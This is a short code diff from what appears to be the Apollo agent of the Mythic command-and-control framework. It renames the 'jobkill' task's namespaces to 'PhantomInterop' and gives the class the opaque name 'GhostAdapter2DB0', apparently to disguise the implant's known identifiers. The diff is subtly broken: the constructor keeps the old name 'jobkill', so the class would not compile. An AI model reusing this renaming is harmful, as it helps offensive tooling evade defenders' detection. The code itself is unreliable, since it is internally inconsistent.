@@ -6,13 +6,13 @@
 
 #if JOBKILL
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 
 namespace Tasks
 {
-    public class jobkill : Tasking
+    public class GhostAdapter2DB0 : Tasking
     {
         public jobkill(IAgent agent, MythicTask data) : base(agent, data)
         {
